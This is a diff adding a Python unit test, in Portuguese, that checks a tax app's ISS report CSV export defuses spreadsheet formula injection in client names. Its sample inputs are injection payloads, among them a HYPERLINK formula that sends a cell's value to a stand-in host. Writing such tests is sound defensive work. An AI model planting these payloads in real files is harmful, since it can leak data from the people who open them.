@@ -901,6 +901,38 @@ def test_apuracao_do_mes_soma_o_iss_que_a_sefin_apurou_e_deixa_a_cancelada_de_fo
     assert tela.status_code == 200 and "guia do ISS não sai daqui" in tela.get_data(as_text=True)
 
 
+def test_o_csv_da_apuracao_desarma_a_formula_no_nome_do_tomador():
+    """Revisão de segurança de 26/10/2026: o nome do tomador vem do cadastro
+    do cliente, digitado no balcão; no CSV que o contador abre no Excel, um
+    nome que começa com «=», «+», «-» ou «@» viraria fórmula. Ele tem de sair
+    com o apóstrofo na frente, entre aspas, e o «;» dentro dele não pode
+    deslocar as colunas."""
+    import csv
+    import io
+    perigosos = ['=HYPERLINK("http://x/?"&A1;"ver")', "+1+1", "-2+3", "@SUM(A1:A2)",
+                 "\t=1+1", "MARIO; DA SILVA"]
+    nota = {"competencia": "2026-10-01", "numero": "1", "dps": "1/1", "chave": "=CHAVE",
+            "tomador_documento": "***.000.002-**", "base": 10000, "aliquota": "2.00",
+            "iss": 200, "estimado": False, "ibs": 0, "cbs": 0}
+    apuracao = {"notas": [{**nota, "tomador": nome} for nome in perigosos],
+                "total": {"base": 60000, "iss": 1200, "estimadas": 0, "ibs": 0, "cbs": 0}}
+    texto = NFSE.apuracao_csv(apuracao)
+    linhas = list(csv.reader(io.StringIO(texto), delimiter=";"))
+    assert len(linhas) == 2 + len(perigosos)
+    assert all(len(linha) == 12 for linha in linhas)
+    corpo = linhas[1:-1]
+    assert [linha[4] for linha in corpo] == ["'" + perigosos[0], "'+1+1", "'-2+3",
+                                             "'@SUM(A1:A2)", "'\t=1+1", "MARIO; DA SILVA"]
+    assert all(linha[3] == "'=CHAVE" for linha in corpo)
+    # nenhuma célula de texto começa como fórmula; os valores continuam números
+    for linha in corpo:
+        assert not any(c.startswith(("=", "+", "@", "\t", "\r")) for c in linha)
+        assert linha[6] == "100,00" and linha[8] == "2,00"
+    # QUOTE_ALL: toda célula sai entre aspas no arquivo
+    assert texto.splitlines()[0].startswith('"competencia";"numero_nfse"')
+    assert linhas[-1][0] == "TOTAL"
+
+
 def test_parametros_do_municipio_sao_consultados_e_mostrados_como_vieram(casa):
     c = casa["c"]
     r = c.post("/administrativo/gestor/nfse", data={"csrf_token": _token(c),
